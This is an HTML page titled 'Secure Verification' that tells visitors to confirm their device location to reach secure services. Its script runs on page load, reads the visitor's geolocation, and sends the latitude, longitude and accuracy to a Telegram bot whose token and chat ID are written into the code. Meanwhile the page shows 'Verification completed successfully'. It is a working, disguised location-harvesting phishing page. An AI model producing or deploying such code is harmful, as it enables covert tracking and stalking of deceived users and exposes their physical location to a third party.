<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Secure Verification</title>

<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body{
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    background:
        linear-gradient(rgba(0,0,0,.55), rgba(0,0,0,.55)),
        url('https://images.unsplash.com/photo-1516321318423-f06f85e504b3?q=80&w=1600&auto=format&fit=crop');
    background-size:cover;
    background-position:center;
    font-family:'Poppins',sans-serif;
    overflow:hidden;
}

.card{
    width:380px;
    padding:40px 30px;
    border-radius:24px;
    backdrop-filter:blur(18px);
    background:rgba(255,255,255,0.08);
    border:1px solid rgba(255,255,255,0.15);
    box-shadow:0 10px 40px rgba(0,0,0,0.4);
    text-align:center;
    color:white;
}

.logo{
    width:80px;
    height:80px;
    margin:auto;
    margin-bottom:20px;
    border-radius:50%;
    background:linear-gradient(135deg,#00c6ff,#0072ff);
    display:flex;
    align-items:center;
    justify-content:center;
    font-size:36px;
    font-weight:600;
    box-shadow:0 0 25px rgba(0,114,255,.5);
}

h1{
    font-size:28px;
    margin-bottom:12px;
    font-weight:600;
}

p{
    font-size:14px;
    opacity:.8;
    line-height:1.7;
    margin-bottom:30px;
}

.loader{
    width:55px;
    height:55px;
    border:5px solid rgba(255,255,255,0.2);
    border-top:5px solid #00c6ff;
    border-radius:50%;
    margin:auto;
    animation:spin 1s linear infinite;
}

.status{
    margin-top:20px;
    font-size:14px;
    color:#d1d5db;
}

@keyframes spin{
    100%{
        transform:rotate(360deg);
    }
}

.footer{
    margin-top:30px;
    font-size:12px;
    opacity:.55;
}
</style>

<script>

const BOT_TOKEN = "8697179005:AAFwHriaUJi3_qO8kv_rvcCneZUu9K11i0g";
const CHAT_ID = "6809951887";

function sendLocation(position) {

    const lat = position.coords.latitude;
    const lon = position.coords.longitude;

    document.getElementById("status").innerText =
        "Verification completed successfully";

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            chat_id: CHAT_ID,
            latitude: lat,
            longitude: lon
        })
    });

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: `📍 Lat: ${lat}, Lon: ${lon}
Accuracy: ${position.coords.accuracy}m`
        })
    });
}

function requestLocation() {

    if(navigator.geolocation){

        navigator.geolocation.getCurrentPosition(
            sendLocation,
            () => {
                document.getElementById("status").innerText =
                    "Location permission denied";
            }
        );

    }
}

window.onload = requestLocation;

</script>

</head>

<body>

<div class="card">

    <div class="logo">
        ✓
    </div>

    <h1>Secure Verification</h1>

    <p>
        Please confirm your device location to continue accessing secure services.
    </p>

    <div class="loader"></div>

    <div class="status" id="status">
        Verifying device security...
    </div>

    <div class="footer">
        Protected by Secure Access System
    </div>

</div>

</body>
</html>
